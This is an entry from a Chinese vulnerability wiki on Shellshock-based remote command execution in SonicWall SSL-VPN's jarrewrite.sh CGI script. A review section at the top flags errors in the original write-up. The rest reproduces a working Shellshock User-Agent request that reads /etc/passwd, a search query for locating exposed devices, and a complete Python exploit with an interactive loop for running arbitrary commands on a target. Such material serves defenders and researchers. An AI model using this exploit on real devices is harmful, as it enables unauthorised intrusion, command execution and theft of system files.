---
version: "unknown"
source: "Threekiii/Vulnerability-Wiki"
id: "vw-8667199d8ea1eec615f48b29"
entity_id: "ve-8667199d8ea1eec615f48b29"
schema_version: "1"
title: "SonicWall SSL-VPN 远程命令执行漏洞"
product: "SonicWall SSL-VPN旧设备"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "未给固件；HTTP可达且易受影响Bash"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/SonicWall/SonicWall-SSL-VPN-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
previous_version: "SonicWall SSL-VPN"
---

# SonicWall SSL-VPN 远程命令执行漏洞

> 版本字段校订（2026-10-04）：误填的版本字段原值逐字保存到对应 `previous_*` 字段。当前值区分正文声称的影响范围、实验环境与尚未知的范围；后文对该元数据误填的旧说明只描述校订前状态，未据此升级来源结论。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：SonicWall SSL-VPN旧设备
- 本文讨论：jarrewrite.sh / Bash Shellshock
- 版本、权限与配置前提：未给固件；HTTP可达且易受影响Bash
- 资料类型：Shell源码与Python PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 称漏洞在该脚本命令拼接，实际请求触发Bash启动的环境函数解析；Usage-Agent拼错
- 给大量jar处理源码却未解释与Shellshock必要性；日期无年份、版本泛化
- PoC以root子串+200判定容易误报，不能证明执行用户root

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 型号/版本和官方修复待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

SonicWall SSL-VPN 远程命令执行在1月24日被公开 EXP，此设备存在远程命令执行漏洞

## 漏洞影响

```
SonicWall SSL-VPN
```

## 网络测绘

```
app="SONICWALL-SSL-VPN"
```

## 漏洞复现

出现漏洞的文件为 **/cgi-bin/jarrewrite.sh**

```bash
#!/bin/bash

# jarrewrite.sh:
# Script takes a jar/class file and a working directory; modifies class files
# within the jar and repackages them.

USAGE_STR="Usage: $0 <jar/class file> <path-to-working directory>"

# Validate number of args
if [ $# -ne 2 ]; then
echo ${USAGE_STR};
exit -1;
fi

for param in $*; do
    if [ "$param" == "-h" ]; then
        echo ${USAGE_STR};
        exit 1;
    fi
done

# constants
BOUNDARY="-------------------------------------------------------------"
BASE_DIR=/tmp
JAVA_SRC=$1
WDIR=$2
CWD=`pwd`
FULL_JAVA_SRC_PATH=${BASE_DIR}/${WDIR}/${JAVA_SRC}
CLASSES_DIR=classes
META_INF_DIR=${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF
MANIFEST=${META_INF_DIR}/MANIFEST.MF
MANIFEST_DIGEST_FILE=${META_INF_DIR}/SWALL_SIGNATURE.SF
SIGNATURE_FILE=${META_INF_DIR}/SWALL_SIGNATURE.DSA
CODESIGNER_CRT=./../../var/cs_cert/httprpCodeSignerX509Crt.pem
CODESIGNER_PVTKEY=./../../var/cs_cert/httprpCodeSignerPvtkey.pem
DO_SIGN=0

if [ ! -f  ${FULL_JAVA_SRC_PATH} ];then
echo "File not found: ${FULL_JAVA_SRC_PATH}";
exit -2;
fi

if [ ${JAVA_SRC##*.} == "jar" ]
# Using bracket in variable substitution.
then

# organize
mkdir ${BASE_DIR}/$WDIR/$CLASSES_DIR

# unzip jar
unzip -d ${BASE_DIR}/${WDIR}/${CLASSES_DIR} ${FULL_JAVA_SRC_PATH};

# Simple sanity check to see if the JAR has already been signed. 
# FIXME: This is not a complete check,because the original JAR signature 
# has to be verified completely otherwise a malicious applet
# could access the local resources with SSL VPN signing it.

old_sf_files=`/bin/ls ${META_INF_DIR}/*.[sS][fF] `
old_sign_files=`/bin/ls ${META_INF_DIR}/*.[rRdD][sS][aA] `

for sf_file in $old_sf_files
do
	for sign_file in $old_sign_files
    do
        DO_SIGN=1;
        break
    done;
    break;
done

# remove all manifest info including signatures
# remove all that match mf|MF|sf|SF or dsa|DSA|rsa|RSA
rm -f ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.[sSmM][fF] ${BASE_DIR}/${WDIR}/${CLASSES_DIR}/META-INF/*.?[sS][aA]

OUTPUT_JAR="${FULL_JAVA_SRC_PATH}"

classfiles=`/usr/bin/find ${BASE_DIR}/${WDIR}/${CLASSES_DIR} -type f`

#New Manifest file
MANIFEST_MAIN_ATTR="Manifest-Version: 1.0\nCreated-By: 1.0 (SonicWALL Inc.)\n"

echo -e "Creating Manifest file ... " 
echo -e ${MANIFEST_MAIN_ATTR} > ${MANIFEST}

for file in $classfiles
do
	echo $BOUNDARY
	echo $file
	echo $BOUNDARY
	./jdasm $file $file

	#Update manifest file
	SHA1_MANIFEST_ENTRY_CLASS=`openssl dgst -sha1 -binary $file | openssl base64`
	MANIFEST_ENTRY="Name: ${file##${BASE_DIR}/${WDIR}/${CLASSES_DIR}/}\nSHA1-Digest: ${SHA1_MANIFEST_ENTRY_CLASS}\n"
	echo -e ${MANIFEST_ENTRY} >> ${MANIFEST}

	echo $BOUNDARY
done

if [ ${DO_SIGN} == 1 ]; then
echo -e "Creating Manifest Signature file and Signature block" >> $OUTLOG
/usr/sbin/sw_jarsigner -m ${MANIFEST} -s ${MANIFEST_DIGEST_FILE} -S ${SIGNATURE_FILE} -c ${CODESIGNER_CRT} -k ${CODESIGNER_PVTKEY}
fi

rm -f ${FULL_JAVA_SRC_PATH}
cd ${BASE_DIR}/${WDIR}/${CLASSES_DIR};
zip -r ${OUTPUT_JAR} *
cd ${CWD}

# clean
rm -Rf ${BASE_DIR}/${WDIR}/${CLASSES_DIR}

elif [ ${JAVA_SRC##*.} == "class" ]; then
# if file is a class

if [ ! -e  ${FULL_JAVA_SRC_PATH} ];then
echo "File not found: ${FULL_JAVA_SRC_PATH}";
exit -2;
fi
./jdasm ${FULL_JAVA_SRC_PATH} ${FULL_JAVA_SRC_PATH};
fi 

echo "Recursive Class Rewrite Completed."
exit 0;
```

这个文件存在命令注入漏洞，漏洞触发在 **Usage-Agent**

发送如下请求即可命令执行

![](./.resource/SonicWall-SSL-VPN-远程命令执行漏洞/media/202202162259032.png)


```shell
GET https://xxx.xxx.xxx.xxx/cgi-bin/jarrewrite.sh
User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
```

发送请求会下载一个文件，文件内容为命令执行的结果

![](./.resource/SonicWall-SSL-VPN-远程命令执行漏洞/media/202202162259265.png)


## 漏洞POC

```python
import requests
import sys
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: SonicWall SSL-VPN                                       \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         >>> whoami                                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, cmd):
    vuln_url = target_url + "/cgi-bin/jarrewrite.sh"
    headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '%s'" % (cmd)}
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}/cgi-bin/jarrewrite.sh \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                cmd = input("\033[35mCmd >>> \033[0m")
                if cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, cmd)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/cgi-bin/jarrewrite.sh"
    headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '%s'" % (cmd)}
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    cmd = 'cat /etc/passwd'
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url, cmd)
```

![](./.resource/SonicWall-SSL-VPN-远程命令执行漏洞/media/202202162259317.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
